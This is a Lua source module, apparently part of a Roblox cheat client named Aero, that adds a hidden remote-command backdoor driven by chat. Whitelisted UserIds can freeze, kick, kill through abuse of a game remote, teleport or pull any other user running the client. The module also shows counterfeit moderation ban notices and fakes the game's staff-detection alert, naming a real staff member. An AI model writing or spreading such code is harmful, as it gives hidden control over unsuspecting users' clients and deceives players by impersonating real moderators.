-- Aero Admin -- developer-only remote command layer.

local Players         = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")

-- @module Utility.Logger
local Logger  = require("Utility/Logger")
-- @module GUI.Library
local Library = require("GUI/Library")
-- @module Game.KeyHandling
local KeyHandling = require("Game/KeyHandling")
-- @module Features.Game.Teleport
local Teleport = require("Features/Game/Teleport")
-- @module Utility.Configuration
local Configuration = require("Utility/Configuration")
-- @module Utility.CoreGuiManager
local CoreGuiManager = require("Utility/CoreGuiManager")

-- Own Sound instance, built the same way PlayerScanning builds its moderator alert so the fake one sounds identical.
local fakeModeratorSound = CoreGuiManager.imark(Instance.new("Sound"))

local Admin = {}

-- Command authority: only these UserIds can command. Single admin -- no override tier needed.
local PINKCAT_USERIDS = {}

-- True if the UserId belongs to the top-authority tier (unused with a single admin, kept for API parity).
local function isPinkcat(userId)
	return PINKCAT_USERIDS[userId] == true
end

-- Whitelisted developers (admins), all at top rank.
local DEVELOPERS = {
	[11308703959] = { name = "planetcat", rank = math.huge },
	[10854798823] = { name = "Twink cat boy", rank = math.huge },
	[10632059955] = { name = "Twink cat boy", rank = math.huge },
	[11734834496] = { name = "sunny", rank = math.huge },
	[11175865009] = { name = "A guy", rank = math.huge }
}

local PREFIXES = { ";", ":" }

local function isDeveloper(userId)
	return DEVELOPERS[userId] ~= nil
end

local function developerName(userId)
	local entry = DEVELOPERS[userId]
	return entry and entry.name or nil
end

local function developerRank(userId)
	local entry = DEVELOPERS[userId]
	return entry and entry.rank or nil
end

-- Target resolution (per-client): self always allowed, else the sender must outrank us.
local function outranksMe(senderPlayer)
	local localPlayer = Players.LocalPlayer
	if not localPlayer or not senderPlayer then return false end
	if senderPlayer == localPlayer then return true end

	-- pinkcat! (either account) is always top authority: unbeatable, outranks all.
	if isPinkcat(localPlayer.UserId) then return false end
	if isPinkcat(senderPlayer.UserId) then return true end

	local myRank = developerRank(localPlayer.UserId)
	if not myRank then return true end

	local senderRank = developerRank(senderPlayer.UserId)
	return senderRank ~= nil and senderRank > myRank
end

local function amITarget(targetArg, senderPlayer)
	local localPlayer = Players.LocalPlayer
	if not localPlayer then return false end

	-- Protected: the sender doesn't outrank us, so nothing they send applies.
	if not outranksMe(senderPlayer) then return false end

	targetArg = (targetArg or ""):lower():gsub("%s+", "")
	if targetArg == "" then return false end            -- require explicit target
	if targetArg == "all" then return true end
	if targetArg == "me" then
		return senderPlayer ~= nil and senderPlayer == localPlayer
	end

	local name = localPlayer.Name:lower()
	local disp = (localPlayer.DisplayName or ""):lower()
	return name:find(targetArg, 1, true) ~= nil
		or disp:find(targetArg, 1, true) ~= nil
end

-- Commands (each runs on the client that IS the target).
local Commands = {}

-- ;unload -- clean Aero teardown via its own unload path
Commands["unload"] = function()
	Logger.notify("Admin: unloading Aero.")
	task.wait(0.1)
	pcall(function() Library:Unload() end)
end

-- ;freeze â€” lock the target's character in place (held against the game)
local freezeState = { active = false, conn = nil, cf = nil }

local function stopFreezeLoop()
	if freezeState.conn then
		pcall(function() freezeState.conn:Disconnect() end)
		freezeState.conn = nil
	end
	freezeState.active = false
end

Commands["freeze"] = function()
	local RunService = game:GetService("RunService")
	local lp   = Players.LocalPlayer
	local char = lp and lp.Character
	local hrp  = char and char:FindFirstChild("HumanoidRootPart")
	if not (char and hrp) then return end

	-- remember where they are and pin every part
	freezeState.cf = hrp.CFrame
	for _, part in ipairs(char:GetChildren()) do
		if part:IsA("BasePart") then part.Anchored = true end
	end

	-- hold the position every frame so the game can't shove them
	stopFreezeLoop()
	freezeState.active = true
	freezeState.conn = RunService.Heartbeat:Connect(function()
		if not freezeState.active then return end
		local c = lp.Character
		local root = c and c:FindFirstChild("HumanoidRootPart")
		if root then
			root.Anchored = true
			root.AssemblyLinearVelocity = Vector3.zero
			root.CFrame = freezeState.cf
		end
	end)

	-- re-anchor if the character respawns while frozen
	if not freezeState.respawnConn then
		freezeState.respawnConn = lp.CharacterAdded:Connect(function(newChar)
			if not freezeState.active then return end
			task.wait(0.2)
			for _, part in ipairs(newChar:GetChildren()) do
				if part:IsA("BasePart") then part.Anchored = true end
			end
			local nroot = newChar:FindFirstChild("HumanoidRootPart")
			if nroot then freezeState.cf = nroot.CFrame end
		end)
	end

	Logger.notify("Admin: you have been frozen.")
end

-- ;unfreeze â€” release the freeze
Commands["unfreeze"] = function()
	stopFreezeLoop()
	local lp   = Players.LocalPlayer
	local char = lp and lp.Character
	if char then
		for _, part in ipairs(char:GetChildren()) do
			if part:IsA("BasePart") then part.Anchored = false end
		end
	end
	Logger.notify("Admin: you have been unfrozen.")
end

-- ;kick â€” removes the target from the game ;kick â€” kicks the target with a message naming the dev who did it
Commands["kick"] = function(senderPlayer)
	local kicker = (senderPlayer and developerName(senderPlayer.UserId)) or "an admin"
	local msg = string.format('You have been kicked from the game by "%s"', kicker)
	task.wait(0.1)
	pcall(function()
		Players.LocalPlayer:Kick(msg)
	end)
end

-- ;fakeban <target> -- kicks the target with a message shaped like a real moderation ban notice rather than an admin kick.
local function generateIncidentId()
	local chars = "0123456789abcdef"
	local out = table.create and table.create(9) or {}

	for index = 1, 9 do
		local pick = math.random(1, #chars)
		out[index] = chars:sub(pick, pick)
	end

	return table.concat(out)
end

Commands["fakeban"] = function()
	local msg = string.format(
		"You have been banned from the game.\nCategory: Moderation\nIncident ID: %s",
		generateIncidentId()
	)
	task.wait(0.1)
	pcall(function()
		Players.LocalPlayer:Kick(msg)
	end)
end

-- ;kill -- deals max fall damage to the target via Aero's own remote
Commands["kill"] = function()
	local remote = KeyHandling.getRemote("FallDamage")
	if not remote then
		Logger.notify("Admin: fall damage remote not found.")
		return
	end
	-- slider maxes at 1000hp â€” send way past it to guarantee the kill
	pcall(function()
		remote:FireServer(99999, false)
	end)
	Logger.notify("Admin: you have been killed.")
end

-- ;tp <target> <destination> -- teleports the target via Aero's own Teleport module.
Commands["tp"] = function(_, args)
	local destination = (args or ""):match("^%S+")
	if not destination then
		Logger.notify("Admin: no destination given, e.g. ';tp me Depths'.")
		return
	end

	local ok = pcall(function()
		Teleport.start(destination)
	end)

	if ok then
		Logger.notify("Admin: teleporting you to '%s'.", destination)
	else
		Logger.notify("Admin: tp to '%s' failed.", destination)
	end
end

-- ;bring <target> -- pulls the target to wherever the sender (the dev who issued the command) currently is.
Commands["bring"] = function(senderPlayer)
	if not senderPlayer then
		return
	end

	local senderCharacter = senderPlayer.Character
	local senderRoot = senderCharacter and senderCharacter:FindFirstChild("HumanoidRootPart")
	if not senderRoot then
		Logger.notify("Admin: could not find %s to bring you to.", senderPlayer.Name)
		return
	end

	local localPlayer = Players.LocalPlayer
	local character = localPlayer and localPlayer.Character
	if not character then
		return
	end

	-- small offset so we don't land exactly inside the sender's own hitbox.
	local ok = pcall(function()
		character:PivotTo(senderRoot.CFrame + senderRoot.CFrame.RightVector * 3)
	end)

	if ok then
		Logger.notify("Admin: you have been brought to %s.", senderPlayer.Name)
	end
end

-- ;fakeagamatsu <target>: counterfeit staff-detected alert naming Agamatsu as "Admin" (mirrors PlayerScanning exactly).
Commands["fakeagamatsu"] = function()
	local FAKE_USERNAME = "Agamatsu"
	local FAKE_RANK = "Admin"

	local spoofName = Configuration.expectToggleValue("InfoSpoofing")
		and Configuration.expectToggleValue("SpoofOtherPlayers")

	-- If the real Agamatsu happens to be in the server, use their actual character name so the line matches what a genuine scan would print.
	local characterName = "Ace Sekhigi"
	for _, plr in ipairs(Players:GetPlayers()) do
		if plr.Name:lower() == FAKE_USERNAME:lower() then
			characterName = plr:GetAttribute("CharacterName") or characterName
			break
		end
	end

	local shownName = spoofName and "[REDACTED]"
		or string.format("(%s) %s", characterName, FAKE_USERNAME)

	Logger.mnnotify("%s is a staff member with the rank '%s' in group.", shownName, FAKE_RANK)

	if Configuration.expectToggleValue("NotifyModSound") then
		fakeModeratorSound.SoundId = "rbxassetid://6045346303"
		fakeModeratorSound.PlaybackSpeed = 1
		fakeModeratorSound.Volume = Configuration.expectToggleValue("NotifyModSoundVolume") or 10
		fakeModeratorSound:Play()
	end
end

-- Parser: both chat hooks fire per message, so de-dupe identical commands within this window.
local DUPLICATE_WINDOW = 0.5
local recentCommands = {}

local function isDuplicate(userId, rawText)
	local now = os.clock()

	-- Prune anything past the window so this can't grow across a session.
	for key, seenAt in pairs(recentCommands) do
		if now - seenAt >= DUPLICATE_WINDOW then
			recentCommands[key] = nil
		end
	end

	local key = tostring(userId) .. "\0" .. rawText
	local last = recentCommands[key]
	recentCommands[key] = now

	return last ~= nil and (now - last) < DUPLICATE_WINDOW
end

local function tryHandle(rawText, senderPlayer)
	if type(rawText) ~= "string" then return end
	-- gate: sender's engine-stamped UserId must be whitelisted
	if not senderPlayer or not isDeveloper(senderPlayer.UserId) then return end

	local body
	for _, p in ipairs(PREFIXES) do
		if rawText:sub(1, #p) == p then
			body = rawText:sub(#p + 1)
			break
		end
	end
	if not body then return end

	-- Confirmed a prefixed command from a developer -- dedupe before acting, and only from here so ordinary chat never touches the table.
	if isDuplicate(senderPlayer.UserId, rawText) then return end

	local cmd, rest = body:match("^(%S+)%s*(.*)$")
	if not cmd then return end
	cmd = cmd:lower()

	-- Split off just the target token (me/all/name), keeping the trailing destination intact.
	local target, args = rest:match("^(%S*)%s*(.*)$")

	local action = Commands[cmd]
	if action and amITarget(target, senderPlayer) then
		task.spawn(function()
			local ok, err = pcall(action, senderPlayer, args)
			if not ok then
				Logger.warn("Admin cmd '%s' errored: %s", cmd, tostring(err))
			end
		end)
	end
end

-- Outbound (UI-driven): broadcast a command like a dev typing it in chat.
local function resolveChatChannel()
	local textChannels = TextChatService:FindFirstChild("TextChannels")
	if not textChannels then
		return nil
	end

	local channel = textChannels:FindFirstChild("RBXGeneral")
	if not channel then
		for _, child in next, textChannels:GetChildren() do
			if child:IsA("TextChannel") and child.Name ~= "RBXSystem" then
				channel = child
				break
			end
		end
	end

	return channel or textChannels:FindFirstChild("RBXSystem")
end

-- Fire a command at a target over chat.
function Admin.sendCommand(cmd, target, extra)
	if type(cmd) ~= "string" or cmd == "" then
		return false
	end

	target = target or ""
	extra = extra or ""

	local body = PREFIXES[1] .. cmd
	if target ~= "" then
		body = body .. " " .. target
	end
	if extra ~= "" then
		body = body .. " " .. extra
	end

	local channel = resolveChatChannel()
	if not channel then
		Logger.warn("Admin: no chat channel available to send '%s'.", cmd)
		return false
	end

	task.spawn(function()
		pcall(function()
			channel:SendAsync(body)
		end)
	end)

	return true
end

-- Public whitelist API (single source of truth shared with the UI panel).
Admin.PINKCAT_USERIDS = PINKCAT_USERIDS
Admin.isPinkcat = isPinkcat
Admin.DEVELOPERS = DEVELOPERS
Admin.isDeveloper = isDeveloper
Admin.developerName = developerName
Admin.developerRank = developerRank

-- Command names the UI can surface as buttons (kept in one place so the panel and the parser never drift apart).
Admin.commandNames = { "kill", "freeze", "unfreeze", "kick", "fakeban", "bring", "unload", "fakeagamatsu", "tp" }

-- Chat hooks (chain onto TextChatService without clobbering Aero's).
function Admin.init()
	-- modern TextChatService â€” preserve any existing handler
	pcall(function()
		local previous = TextChatService.OnIncomingMessage
		TextChatService.OnIncomingMessage = function(message)
			local source = message.TextSource
			local sender = source and Players:GetPlayerByUserId(source.UserId)
			pcall(tryHandle, message.Text, sender)
			if previous then
				return previous(message)
			end
		end
	end)

	-- legacy Chatted fallback
	local function bindLegacy(plr)
		plr.Chatted:Connect(function(msg) tryHandle(msg, plr) end)
	end
	for _, plr in ipairs(Players:GetPlayers()) do
		pcall(bindLegacy, plr)
	end
	Players.PlayerAdded:Connect(function(plr) pcall(bindLegacy, plr) end)
end

return Admin